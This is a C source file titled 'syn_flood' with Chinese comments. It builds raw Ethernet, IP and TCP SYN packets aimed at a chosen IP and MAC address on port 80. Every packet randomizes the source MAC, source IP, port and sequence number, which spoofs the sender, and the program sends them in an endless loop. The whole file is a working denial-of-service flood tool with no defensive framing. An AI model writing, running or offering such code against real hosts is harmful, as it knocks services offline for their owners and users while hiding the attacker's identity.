/* syn_flood */
# include <stdio.h>
# include <string.h>
# include <sys/socket.h>
# include <linux/if_ether.h>
# include <linux/if_arp.h>
# include <sys/types.h>
# include <linux/sockios.h>
# include <time.h>
# include <stdlib.h>
# include <arpa/inet.h>
# include <malloc.h>
# include <sys/ioctl.h>

# define ETH_LEN 14
# define IPH_LEN 20
# define TCP_LEN 20

//接收20个字节的IP报文首地址
extern short int checksum_ip(char *iph) ;

//接收20个字节的IP报文首地址 + 20个字节的TCP报文
extern short int checksum_tcp(char *iph) ;

//字符串拆分 char *string为要拆分的字符串 char flag为根据什么字符来拆分 char **buf为拆分后保存到的地方(二级指针方便之后获取)
int string_cut(char *string , char flag , char **buf) ;

//把格式为十六进制的ASCII码转换成1个字节的char类型 只能转换2个字节的数据
unsigned char hexstr_to_char(char *hex) ;

//随机数
char myrandom(void) ;

int main(int argc , char **argv)
{
	if (argc < 3)
	{
		printf("usage : $1 == dest IP\n") ;
		printf("usage : $2 == dest MAC\n") ;
		printf("usage : $3 == ETH_NAME\n") ;
		printf("./syn 192.168.1.1 AA:BB:CC:DD:EE:FF eth0\n") ;
		return 0 ;
	}

	//把点分十进制的IP地址转换成unsigned int类型 并从主机字节序转换成网络字节序
	unsigned int IP = htonl(inet_addr(argv[1])) ;

	//用来拆分unsigned int类型的IP地址
	struct IP_LIST
	{
		unsigned int	IP4 : 8 ,
				IP3 : 8 ,
				IP2 : 8 ,
				IP1 : 8 ;
	} ;
	//把unsigned int 类型的IP地址 拆分成4个单个字节的数据
	struct IP_LIST *ip_list ;
	ip_list = (struct IP_LIST *)&IP ;

	//申请二维数组
	char **buf = (char **)malloc(sizeof(char *) * 10) ;
	int N = 0 ;
	for(N=0;N<10;N++)
	{
		buf[N] = (char *)malloc(10) ;
	}

	//分割MAC地址 按照":"来切割 存到刚申请的二维数组内
	string_cut(argv[2],':',buf) ;
	unsigned char MAC[6] ;
	for(N=0;N<6;N++)
	{
		//把十六进制格式的ASCII码转换成1个字节的数据
		MAC[N] = hexstr_to_char(buf[N]) ;
	}

	//释放二维数组
	for(N=0;N<10;N++)
	{
		free(buf[N]) ;
	}
	free(buf) ;

	//如果用户没输入网卡接口名则默认使用eth0
	char ETH_NAME[30] ;
	if(argc == 4)
	{
		strcpy(ETH_NAME,argv[3]) ;
	}
	else
	{
		strcpy(ETH_NAME,"eth0") ;
	}

	//打印 IP地址 MAC地址 网卡名
	//printf("%d.%d.%d.%d\n",ip_list->IP1,ip_list->IP2,ip_list->IP3,ip_list->IP4) ;
	//printf("%02X:%02X:%02X:%02X:%02X:%02X\n",MAC1,MAC2,MAC3,MAC4,MAC5,MAC6) ;
	//printf("%s\n",ETH_NAME) ;

	//随机数 初始化 传递一个种子
	srand(time(NULL)) ;

	//申请报文存放的空间
	char msg[ETH_LEN+IPH_LEN+TCP_LEN] ;

	short int checksum ;
	int raw_sock_fd ;

	//申请一个原始套接字
	raw_sock_fd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)) ;
	if (raw_sock_fd == -1)
	{
		printf("get raw sock fd faild \n") ;
		return 1 ;
	}

	//获取网卡名的编号
	struct sockaddr_ll sll ;
	bzero(&sll,sizeof(struct sockaddr_ll)) ;
	struct ifreq ifr;
	strncpy(ifr.ifr_name, ETH_NAME , IFNAMSIZ);
	ioctl(raw_sock_fd, SIOCGIFINDEX, &ifr);
	sll.sll_ifindex = ifr.ifr_ifindex;

	//开始封装报文 因考虑到程序的可读性 并没有做优化
	there :
	/* 以太网帧 */
	//目的MAC地址
	msg[0] = MAC[0] ;
	msg[1] = MAC[1] ;
	msg[2] = MAC[2] ;
	msg[3] = MAC[3] ;
	msg[4] = MAC[4] ;
	msg[5] = MAC[5] ;

	//源MAC地址
	msg[6] = myrandom() ;
	msg[7] = myrandom() ;
	msg[8] = myrandom() ;
	msg[9] = myrandom() ;
	msg[10] = myrandom() ;
	msg[11] = myrandom() ;
	//类型
	msg[12] = 0x08 ;
	msg[13] = 0x00 ;

	/* IP报文 */
	//版本 IPV4 0100 + 报头长度 5 = 0101 ; 0100 0101 = 69
	msg[14] = 69 ;
	//服务级别
	msg[15] = 0 ;
	//报文长度 整个报文的长度 IPH + TCP + DATA
	msg[16] = 0x00 ;
	msg[17] = 40 ;
	//标识
	msg[18] = myrandom() ;
	msg[19] = myrandom() ;
	//标志 分段偏移
	msg[20] = 0x40 ;
	msg[21] = 0x00 ;
	//生存时间
	msg[22] = 255 ;
	//用户协议 0x06 表示 TCP报文
	msg[23] = 0x06 ;
	//报头校验和
	msg[24] = 0 ; 
	msg[25] = 0 ;
	//源IP地址
	msg[26] = myrandom() ;
	msg[27] = myrandom() ;
	msg[28] = myrandom() ;
	msg[29] = myrandom() ;
	//目的IP地址
	msg[30] = ip_list->IP1 ;
	msg[31] = ip_list->IP2 ;
	msg[32] = ip_list->IP3 ;
	msg[33] = ip_list->IP4 ;

	/* TCP报文 */
	//源端口
	msg[34] = myrandom() ;
	msg[35] = myrandom() ;
	//目的端口
	msg[36] = 0x00 ;
	msg[37] = 80 ;
	//序号
	msg[38] = myrandom() ;
	msg[39] = myrandom() ;
	msg[40] = myrandom() ;
	msg[41] = myrandom() ;
	//确认序号
	msg[42] = 0 ;
	msg[43] = 0 ;
	msg[44] = 0 ;
	msg[45] = 0 ;
	//数据偏移 保留 ACK SYN 等
	msg[46] = 80 ;
	msg[47] = 2 ;
	//窗口
	msg[48] = myrandom() ;
	msg[49] = myrandom() ;
	//校验和
	msg[50] = 0 ;
	msg[51] = 0 ;
	//紧急指针
	msg[52] = 0 ;
	msg[53] = 0 ;

	checksum = checksum_ip(&(msg[14])) ;
	msg[24] = checksum >> 8 ; 
	msg[25] = checksum << 8 >> 8 ;
	//打印 ip校验和
	//printf("%02X\n",(unsigned char)msg[24]) ;
	//printf("%02X\n",(unsigned char)msg[25]) ;
	//printf("%04X\n",(unsigned short int)checksum) ;

	checksum = checksum_tcp(&(msg[14])) ;
	msg[50] = checksum >> 8 ;
	msg[51] = checksum << 8 >> 8 ;
	//打印 tcp校验和
	//printf("%02X\n",(unsigned char)msg[50]) ;
	//printf("%02X\n",(unsigned char)msg[51]) ;
	//printf("%04X\n",(unsigned short int)checksum) ;	


	//发送报文
	if ( sendto(raw_sock_fd,msg,54,0,(struct sockaddr *)&sll,sizeof(struct sockaddr_ll)) == -1 )
	{
		printf("sendto error\n") ;
		return 1 ;
	}
	else
	{
		printf("sendto ok\n") ;

		//打印发送的十六进制的报文信息
		/*
		for(N=0;N<54;N++)
		{
			if(N%16==0)
			{
				printf("\n") ;
			}
			if(N%8==0)
			{
				printf(" ") ;
			}
			printf("%02X ",(unsigned char)msg[N]) ;
		}
		printf("\n\n") ;
		*/
	}

	//循环封包 发送
	goto there ;
	
	return 0 ;
}

char myrandom(void) 
{
	return (rand() % 254 + 1) ;
}

int string_cut(char *string , char flag , char **buf)
{
	int n = 0 ;
	int x = 0 ;
	int y = 0 ;
	while(string[n] != 0)
	{
		if(string[n] != flag)
		{
			buf[x][y] = string[n] ;
			y++ ;
		}
		else
		{
			buf[x][y] = 0 ;
			x++ ;
			y = 0 ;
		}
		n++ ;
	}
}

unsigned char hexstr_to_char(char *hex)
{
	char ah , al ;
	if((hex[1] <= 57) && (hex[1] >= 48))
	{
		al = hex[1] - '0' ;
	}
	else if ((hex[1] <= 90) && (hex[1] >= 65))
	{
		al = hex[1] - 'A' + 10 ;
	}
	else if ((hex[1] <= 122) && (hex[1] >= 97))
	{
		al = hex[1] - 'a' + 10 ;
	}
	else
	{
		return -1 ;
	}
	if((hex[0] <= 57) && (hex[0] >= 48))
	{
		ah = hex[0] - '0' ;
	}
	else if ((hex[0] <= 90) && (hex[0] >= 65))
	{
		ah = hex[0] - 'A' + 10 ;
	}
	else if ((hex[0] <= 122) && (hex[0] >= 97))
	{
		ah = hex[0] - 'a' + 10 ;
	}
	else
	{
		return -1 ;
	}

	return ah*16+al ;

}
